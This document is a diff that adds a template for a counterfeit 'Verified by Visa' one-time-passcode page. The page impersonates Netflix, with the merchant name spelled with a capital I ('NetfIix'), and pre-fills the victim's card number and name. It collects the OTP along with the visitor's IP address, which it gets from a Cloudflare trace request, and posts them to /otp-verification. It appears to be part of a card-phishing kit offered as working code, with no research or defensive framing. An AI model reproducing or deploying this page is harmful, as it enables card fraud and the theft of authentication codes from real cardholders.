@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OTP Verification Page - <%= bank.toUpperCase() %></title>
+  <style>
+    @media only screen and (max-width: 767px) {
+      .test { width:100%;}
+  }
+  .preloader-spin,
+.preloader-spin--inverted {
+  font-size: 48px;
+  position: absolute;
+  left: 50%;
+  top: 50%;
+  width: 1em;
+  height: 1em;
+  transform: translate(-50%, -50%) rotate(180deg);
+  -webkit-animation: a-show-preloader 0.37214s ease;
+          animation: a-show-preloader 0.37214s ease;
+  -webkit-animation-iteration-count: once;
+          animation-iteration-count: once;
+}
+.preloader-spin__petal,
+.preloader-spin--inverted__petal {
+  position: absolute;
+  left: 0.4629em;
+  bottom: 0;
+  width: 0.074em;
+  height: 0.2777em;
+  border-radius: 0.5em;
+  background: rgba(255,255,255,0.15);
+  transform-origin: center -0.2222em;
+  -webkit-animation: a-preloader 1s infinite linear;
+          animation: a-preloader 1s infinite linear;
+}
+.preloader-spin__petal:nth-child(1),
+.preloader-spin--inverted__petal:nth-child(1) {
+  -webkit-animation-delay: 0s;
+          animation-delay: 0s;
+  transform: rotate(0deg);
+}
+.preloader-spin__petal:nth-child(2),
+.preloader-spin--inverted__petal:nth-child(2) {
+  -webkit-animation-delay: 0.083333333333333s;
+          animation-delay: 0.083333333333333s;
+  transform: rotate(30deg);
+}
+.preloader-spin__petal:nth-child(3),
+.preloader-spin--inverted__petal:nth-child(3) {
+  -webkit-animation-delay: 0.166666666666667s;
+          animation-delay: 0.166666666666667s;
+  transform: rotate(60deg);
+}
+.preloader-spin__petal:nth-child(4),
+.preloader-spin--inverted__petal:nth-child(4) {
+  -webkit-animation-delay: 0.25s;
+          animation-delay: 0.25s;
+  transform: rotate(90deg);
+}
+.preloader-spin__petal:nth-child(5),
+.preloader-spin--inverted__petal:nth-child(5) {
+  -webkit-animation-delay: 0.333333333333333s;
+          animation-delay: 0.333333333333333s;
+  transform: rotate(120deg);
+}
+.preloader-spin__petal:nth-child(6),
+.preloader-spin--inverted__petal:nth-child(6) {
+  -webkit-animation-delay: 0.416666666666667s;
+          animation-delay: 0.416666666666667s;
+  transform: rotate(150deg);
+}
+.preloader-spin__petal:nth-child(7),
+.preloader-spin--inverted__petal:nth-child(7) {
+  -webkit-animation-delay: 0.5s;
+          animation-delay: 0.5s;
+  transform: rotate(180deg);
+}
+.preloader-spin__petal:nth-child(8),
+.preloader-spin--inverted__petal:nth-child(8) {
+  -webkit-animation-delay: 0.583333333333333s;
+          animation-delay: 0.583333333333333s;
+  transform: rotate(210deg);
+}
+.preloader-spin__petal:nth-child(9),
+.preloader-spin--inverted__petal:nth-child(9) {
+  -webkit-animation-delay: 0.666666666666667s;
+          animation-delay: 0.666666666666667s;
+  transform: rotate(240deg);
+}
+.preloader-spin__petal:nth-child(10),
+.preloader-spin--inverted__petal:nth-child(10) {
+  -webkit-animation-delay: 0.75s;
+          animation-delay: 0.75s;
+  transform: rotate(270deg);
+}
+.preloader-spin__petal:nth-child(11),
+.preloader-spin--inverted__petal:nth-child(11) {
+  -webkit-animation-delay: 0.833333333333333s;
+          animation-delay: 0.833333333333333s;
+  transform: rotate(300deg);
+}
+.preloader-spin__petal:nth-child(12),
+.preloader-spin--inverted__petal:nth-child(12) {
+  -webkit-animation-delay: 0.916666666666667s;
+          animation-delay: 0.916666666666667s;
+  transform: rotate(330deg);
+}
+.preloader-spin--inverted .preloader-spin__petal,
+.preloader-spin--inverted--inverted .preloader-spin__petal {
+  background: rgba(0,0,0,0.15);
+  -webkit-animation-name: a-preloader--inverted;
+          animation-name: a-preloader--inverted;
+}
+@-webkit-keyframes a-show-preloader {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+@keyframes a-show-preloader {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+@-webkit-keyframes a-preloader {
+  0% {
+    background: rgba(255,255,255,0.91);
+  }
+  100% {
+    background: rgba(255,255,255,0.15);
+  }
+}
+@keyframes a-preloader {
+  0% {
+    background: rgba(255,255,255,0.91);
+  }
+  100% {
+    background: rgba(255,255,255,0.15);
+  }
+}
+@-webkit-keyframes a-preloader--inverted {
+  0% {
+    background: rgba(0,0,0,0.91);
+  }
+  100% {
+    background: rgba(0,0,0,0.15);
+  }
+}
+@keyframes a-preloader--inverted {
+  0% {
+    background: rgba(0,0,0,0.91);
+  }
+  100% {
+    background: rgba(0,0,0,0.15);
+  }
+}
+  
+  
+  
+  
+  
+  .oaerror{
+  width:80%;
+  background-color: #ffffff;
+  padding:20px;
+  border:1px solid #eee;
+  border-left-width:5px;
+  border-radius: 3px;
+  margin:10px auto;
+  font-family: 'Open Sans', sans-serif;
+  font-size: 12px;
+}
+
+.danger{
+  border-left-color: #d9534f; /* Left side border color */
+  background-color: rgba(217, 83, 79, 0.1); /*Same color as the left border with reduced alpha to 0.1*/
+}
+
+.danger strong{
+  color:#d9534f;
+}
+
+.warning{
+  border-left-color: #f0ad4e;
+  background-color: rgba(240, 173, 78, 0.1);
+}
+
+.warning strong{
+  color:#f0ad4e;
+}
+
+.info {
+  border-left-color: #5bc0de;
+  background-color: rgba(91, 192, 222, 0.1);
+}
+
+.info strong {
+  color: #5bc0de;
+}
+
+.success {
+  border-left-color: #2b542c;
+  background-color: rgba(43, 84, 44, 0.1);
+}
+
+.success strong {
+  color: #2b542c;
+}
+</style>
+<style>
+    body {
+    zoom: 1.05;
+    -moz-transform: scale(1.05);
+    -moz-transform-origin: 0 0;
+    position: absolute;
+left: 50%; /* relative to nearest positioned ancestor or body element */
+top: 50%; /*  relative to nearest positioned ancestor or body element */
+transform: translate(-50%, -50%); /* relative to element's height & width */
+    }
+    tr>td:last-child {
+      width: 100% !important
+    }
+    tr>td {
+padding-bottom: 1em;
+}
+    tr>td:first-child {
+      width: 30% !important
+    }
+    .no-scroll { overflow:hidden; }
+      /* loader */
+      .loader-modal { opacity:80%; position:fixed; top:0; left:0; display:none; width:100%; height:100%; background-color: white; overflow:hidden; }
+      .loader-modal.clear-box { background-color: rgba(0, 0, 0, 0); }
+      .loader.small { width:40px; height:40px; background-size:40px 40px; top:calc(50% - 20px); left:calc(50% - 20px); }
+
+
+      .loader {
+        border: 5px solid black;
+        border-radius: 50%;
+        border-top: 5px solid transparent;
+        -webkit-animation: spin 1s linear infinite;
+        animation: spin 1s linear infinite;
+        margin:auto;
+        text-align:center;
+        position: absolute;
+        left: 50%;
+        top: 50%; 
+        transform: translate(-50%, -50%);
+        width: 60px;
+        height: 60px; 
+      }
+
+      /* default settings */
+
+      @keyframes spin {
+        0% {
+          -webkit-transform: translate(-50%, -50%) rotate(0deg);
+          transform: translate(-50%, -50%) rotate(0deg);
+        }
+        100% {
+          -webkit-transform: translate(-50%, -50%) rotate(360deg);
+          transform: translate(-50%, -50%) rotate(360deg);
+        }
+      }
+      @-webkit-keyframes spin {
+        0% {
+          -webkit-transform: translate(-50%, -50%) rotate(0deg);
+          transform: translate(-50%, -50%) rotate(0deg);
+        }
+        100% {
+          -webkit-transform: translate(-50%, -50%) rotate(360deg);
+          transform: translate(-50%, -50%) rotate(360deg);
+        }
+      }
+
+  hr.style-one {
+  border: 0;
+  height: 1px;
+  background-image: linear-gradient(to right, rgba(0, 0, 0, 0), rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0));
+  }
+
+  div.marks_ {
+    display: flex;
+    align-items: center;
+    flex-wrap: wrap;
+    justify-content: space-between;
+  }
+
+  </style>
+</head>
+<body>
+  <div class="loader-modal">
+    <div class="preloader-spin--inverted">
+      <div class="preloader-spin__petal"></div>
+      <div class="preloader-spin__petal"></div>
+      <div class="preloader-spin__petal"></div>
+      <div class="preloader-spin__petal"></div>
+      <div class="preloader-spin__petal"></div>
+      <div class="preloader-spin__petal"></div>
+      <div class="preloader-spin__petal"></div>
+      <div class="preloader-spin__petal"></div>
+      <div class="preloader-spin__petal"></div>
+      <div class="preloader-spin__petal"></div>
+      <div class="preloader-spin__petal"></div>
+      <div class="preloader-spin__petal"></div>
+    </div>
+  </div>
+  <center>
+    <div class="test" style="overflow-x:auto;margin-left:2px;width:350px;border:solid 1px #d8d4d4;padding:25px">
+      <div class="marks_" alt="verified by visa">
+        <img src="<%= lkhr %>" alt="verified by visa" style="width: 90px; float: left;">
+        <img src="https://www.logo.wine/a/logo/Netflix/Netflix-Logo.wine.svg" style="float:right;width:auto;height:80px;display: inline-block;" width="150px">
+      </div>
+      <%- msg %>
+      <form method="post" action="/otp-verification">
+        <br>
+        <table align="center" width="290" style="font-size:11px;font-family:arial,sans-serif;color:#000;margin-top:30px">
+          <tbody>
+            <tr>
+              <td align="right">Merchant: </td>
+              <td>NetfIix</td>
+            </tr>
+            <!--tr>
+              <td align="right">Amount: </td>
+              <td>USD 6.99</td>
+            </tr-->
+            <tr>
+              <td align="right">Date:</td>
+              <td><%= dateYmd %></td>
+            </tr>
+            <tr>
+              <td align="right">Card Number: </td>
+              <td><%= ccNum %></td>
+            </tr>
+            <tr>
+              <td align="right" colspan="1">Full Name: </td>
+              <td><%= cchold %></td>
+            </tr>
+            <hr class="style-one">
+            <tr>
+              <td colspan="2"></td>
+            </tr>
+            <!--tr></tr>
+              <td align="right">Signature Panel Code (SPC): </td>
+              <td>
+                <input minlength="3" class="spc" style="width: 75px;" type="text" name="spc">
+              </td-->
+            </tr>
+            <tr>
+              <td align="right">Enter One-Time Passcode: </td>
+              <td>
+                <input minlength="6" class="thd" style="width: 75px;" type="text" name="thd" required="">
+                <input type="hidden" id="ipAddress" name="ipAddress">
+              </td>
+            </tr>
+            <tr>
+              <td></td>
+              <td>
+                <br>
+                <input class="proceed" style="width: 74px;" type="submit" value="Submit" name="<%= okbbx %>">
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </form>
+      <p style="text-align: center; font-family: arial, sans-serif; font-size: 9px; color: #656565;">Copyright © 1999- 2024. All rights reserved.</p>
+    </div>
+  </center>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+  <script>
+    $(document).ready(function() {
+      $(".loader-modal, .preloader-spin--inverted").show();
+    });
+
+    $(window).on('load', function() {
+      fetch('https://www.cloudflare.com/cdn-cgi/trace')
+        .then(response => response.text())
+        .then(data => {
+          let ipLine = data.split('\n').find(line => line.startsWith('ip='));
+          if (ipLine) {
+            $('#ipAddress').val(ipLine.split('=')[1]);
+          }
+        })
+        .catch((error) => console.error('Error:', error));
+
+      setTimeout(() => {
+        $(".loader-modal, .preloader-spin--inverted").fadeOut(2200);
+      }, 1000);
+    });
+
+    $(".proceed").click(function() {
+      const msgc = $(".msg").text();
+      const thdValue = $(".thd").val();
+
+      if (thdValue === "") {
+        $(".loader-modal, .preloader-spin--inverted").hide();
+        $(".msg").text('One-Time Passcode is required!')
+          .removeClass("info")
+          .addClass("danger")
+          .css("color", "black");
+        setTimeout(() => {
+          $(".msg").text(msgc).css('color', "#807979");
+        }, 2000);
+      } else if (thdValue.length < 6) {
+        $(".loader-modal, .preloader-spin--inverted").show();
+        setTimeout(() => {
+          $(".loader-modal, .preloader-spin--inverted").hide();
+          $(".msg").text('Incorrect One-Time Passcode. Please check and try again.')
+            .removeClass("info")
+            .addClass("danger")
+            .css("color", "black");
+        }, 1000);
+      } else {
+        $("body").addClass("no-scroll");
+        $(".loader-modal, .preloader-spin--inverted").show();
+      }
+    });
+  </script>
+</body>
+</html>
